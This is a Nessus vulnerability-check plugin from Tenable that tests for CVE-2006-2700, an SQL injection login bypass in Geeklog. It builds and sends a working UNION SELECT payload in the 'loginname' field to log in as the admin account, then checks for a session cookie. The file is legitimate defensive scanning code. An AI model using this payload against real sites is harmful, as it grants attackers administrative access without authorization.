#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(21619);
  script_version("1.22");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-2700");
  script_bugtraq_id(18154);

  script_name(english:"Geeklog auth.inc.php loginname Parameter SQL Injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an authentication bypass issue.");
  script_set_attribute(attribute:"description", value:
"The version of Geeklog installed on the remote fails to sanitize input
to the 'loginname' and 'passwd' parameters before using it in the
script 'admin/auth.inc.php' to construct database queries.  Provided
PHP's 'magic_quotes_gpc' setting is enabled, an unauthenticated
attacker can exploit this flaw to bypass authentication and gain
administrative access.");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/435295/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"https://www.geeklog.net/article.php/geeklog-1.4.0sr3");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Geeklog 1.3.11sr6 / 1.4.0sr3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/05/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/05/31");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:geeklog:geeklog");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 Tenable Network Security, Inc.");

  script_dependencies("geeklog_detect.nasl");
  script_require_keys("www/geeklog");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/geeklog"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  init_cookiejar();

  # Make sure the affected script exists.
  url = string(dir, "/admin/moderation.php");
  r = http_send_recv3(method: "GET", item:url, port:port);
  if (isnull(r)) exit(0);

  # If it does...
  if ('name="loginname" value="" ' >< r[2]) 
  {
    # Try to exploit the issue to bypass authentication.
    uid = 2;                           # Admin account.
    pass = string(unixtime());
    sploit = string(SCRIPT_NAME, "' UNION SELECT 3,'", hexstr(MD5(pass)), "','email',", uid, " --");

    postdata = string(
      "loginname=", urlencode(str:sploit), "&",
      "passwd=", pass
    );
    r = http_send_recv3(method: "POST", version: 11, item: url, data: postdata, port: port,
    add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
    if (isnull(r)) exit(0);

    # There's a problem if we have been authenticated.
    if (
      'meta http-equiv="refresh"' >< r[2] &&
      get_http_cookie(name: "gl_session")
    )
    {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
